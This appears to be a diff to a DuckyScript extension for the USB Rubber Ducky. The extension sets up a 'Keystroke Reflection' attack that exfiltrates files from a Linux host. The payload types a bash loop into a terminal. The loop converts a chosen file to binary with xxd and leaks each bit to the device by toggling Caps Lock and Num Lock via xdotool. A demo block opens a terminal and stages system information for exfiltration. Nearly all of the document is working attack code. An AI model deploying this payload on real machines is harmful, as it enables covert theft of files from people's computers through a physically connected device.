@@ -13,9 +13,8 @@ EXTENSION LINUX_HID_EXFIL
     
         USAGE:
             REQUIRES EXFIL_AUTO_EOF_DETECT EXTENSION
-            DETECT_READY EXTENSION RECOMMENDED
-            Uncomment the function call below to run this extension inline 
-            or call RUN_LINUX_EXFIL() anywhere in your payload after the extension 
+            Prepare data to exfil (in filename defined by TARGET_FILE below)
+            with a terminal window already open - call RUN_LINUX_EXFIL()
     
         DEPLOYMENT:
             Plug Ducky into host, wait for the LED to turn (and stay) solid Green.
@@ -23,15 +22,14 @@ EXTENSION LINUX_HID_EXFIL
 
     REM CONFIGURATION:
     REM File on host machine to exfil using Keystroke Reflection attack
-    DEFINE #TARGET_FILE t.txt
-
-    REM Disable (set FALSE or delete) if using RUN_LINUX_EXFIL in an already open terminal
-    DEFINE #INCLUDE_TERM_OPEN TRUE
-    DEFINE #TERMINAL_OPEN_SHORTCUT CTRL ALT t
-    DEFINE #TERMINAL_OPEN_DELAY 500
+    DEFINE #TARGET_FILE filename.txt
 
     DEFINE #SAVE_AND_RESTORE_LOCKS TRUE
     DEFINE #ENABLE_EXFIL_LEDS TRUE
+    DEFINE #CLOSE_TERMINAL_AFTER_EXFIL TRUE
+
+    REM if TRUE will open terminal, prepare data in #TARGET_FILE, and RUN_LINUX_EXFIL()
+    DEFINE #RUN_SIMPLE_USAGE_DEMO FALSE
 
     FUNCTION RUN_LINUX_EXFIL()
         IF_DEFINED #ENABLE_EXFIL_LEDS
@@ -39,31 +37,35 @@ EXTENSION LINUX_HID_EXFIL
             $_EXFIL_LEDS_ENABLED = TRUE
         END_IF_DEFINED
 
-        IF_DEFINED #INCLUDE_TERM_OPEN
-            #TERMINAL_OPEN_SHORTCUT
-            DELAY #TERMINAL_OPEN_DELAY
-        END_IF_DEFINED
-
         IF_DEFINED #SAVE_AND_RESTORE_LOCKS
             SAVE_HOST_KEYBOARD_LOCK_STATE
         END_IF_DEFINED
 
         $_EXFIL_MODE_ENABLED = TRUE
-        STRINGLN uname -a>#TARGET_FILE
         STRING_BASH
-            o=" Caps_Lock";
-            l=" Num_Lock";
-            c="xdotool key -d4";
-            bs=`xxd -b 
+            c="xdotool key --delay 4";
+            bs=$(xxd -b 
             #TARGET_FILE
-            |cut -d" " -f2-7`;
+            |cut -d" " -f2-7);
             for((i=0;i<${#bs};i++));do 
-                [[ "${bs:$i:1}" == "0" ]]&&c+=$o||c+=$l;
+                b="${bs:$i:1}";
+                if [[ "$b" == "0" ]];then 
+                    c+=" Caps_Lock";
+                fi;
+                if [[ "$b" == "1" ]];then 
+                    c+=" Num_Lock";
+                fi;
             done;
             $c;
-            exit
         END_STRING
 
+        IF_DEFINED #CLOSE_TERMINAL_AFTER_EXFIL
+            STRING exit;
+        END_IF_DEFINED
+
+        ENTER
+
+        REM Requires adding EXFIL_AUTO_EOF_DETECT EXTENSION above this one
         WAIT_FOR_EOF()
 
         $_EXFIL_MODE_ENABLED = FALSE
@@ -76,8 +78,17 @@ EXTENSION LINUX_HID_EXFIL
             RESTORE_HOST_KEYBOARD_LOCK_STATE
         END_IF_DEFINED
     END_FUNCTION
-    
-    REM Uncomment the function call below to run this extension inline (here) 
-    REM or call RUN_LINUX_EXFIL() anywhere in your payload after the extension 
-    REM RUN_LINUX_EXFIL()
+
+    IF_DEFINED #RUN_SIMPLE_USAGE_DEMO
+        REM DO NOT MODIFY THIS DEMO - copy and move outside extension if using as template.
+        REM DEMO Boot Delay
+        DELAY 3000
+        REM Open Terminal
+        CTRL ALT t
+        DELAY 500
+        REM Perpare some data in TARGET_FILE
+        STRINGLN uname -a>#TARGET_FILE
+        REM Exfil data to USB Rubber Ducky using Keystroke Reflection
+        RUN_LINUX_EXFIL()
+    END_IF_DEFINED
 END_EXTENSION
